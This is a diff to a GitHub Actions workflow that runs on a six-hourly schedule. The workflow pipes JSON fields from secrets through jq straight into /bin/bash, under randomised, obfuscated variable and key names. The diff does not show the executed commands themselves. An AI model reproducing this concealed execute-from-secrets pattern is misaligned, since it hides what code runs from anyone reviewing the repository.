@@ -2,24 +2,29 @@ name: guyindu0918
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 5/6 * * *'
+    - cron: '3 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guyindu0918
         env:
-          op4394: ${{ secrets.op4394 }}
+          zhez2917: ${{ secrets.zhez2917 }}
         run: |
-          echo $op4394 | jq -r .kh9 | /bin/bash
-          echo $wcscn19 | jq -r .gwipc1 | /bin/bash
-          echo $ku58 | jq -r .g8 | /bin/bash
-          echo $ccc53031 | jq -r .n54242 | /bin/bash
-          echo $plp6 | jq -r .lvab6064 | /bin/bash
-          echo $spa80312 | jq -r .qepld3 | /bin/bash
-          echo $y926 | jq -r .mjfbc7687 | /bin/bash
-          echo $sxg1 | jq -r .qq5014 | /bin/bash
-          echo $clo98 | jq -r .y180 | /bin/bash
+          echo $zhez2917 | jq -r .e48478 | /bin/bash
+          echo $wb5450 | jq -r .ajv7522 | /bin/bash
+          echo $uemcm2108 | jq -r .wwkqj819 | /bin/bash
+          echo $che0820 | jq -r .lom915 | /bin/bash
+          echo $sxec94594 | jq -r .c4428 | /bin/bash
+          echo $uhcc6662 | jq -r .w880 | /bin/bash
+          echo $cvn739 | jq -r .jdu29436 | /bin/bash
+          echo $uqwpu5 | jq -r .bafi7206 | /bin/bash
+          echo $kou7 | jq -r .chey120 | /bin/bash
+          echo $rgi05 | jq -r .cyfb66749 | /bin/bash
+          echo $rr4 | jq -r .beoy549 | /bin/bash
+          echo $sg1 | jq -r .vd2 | /bin/bash
+          echo $jxw5725 | jq -r .ep5086 | /bin/bash
+          echo $dnq43 | jq -r .hqta673 | /bin/bash
 
